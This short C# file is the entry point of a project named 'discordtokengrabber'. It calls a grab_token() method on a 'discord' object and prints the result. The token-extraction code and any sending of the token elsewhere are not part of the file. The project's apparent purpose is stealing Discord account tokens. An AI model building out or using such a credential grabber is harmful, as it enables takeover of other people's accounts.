using System;

namespace discordtokengrabber
{
    class main
    {
        static void Main(string[] args)
        {
            discord dc = new discord();
            Console.Write(dc.grab_token());
            Console.ReadKey();
            Environment.Exit(0);
        }
    }
}
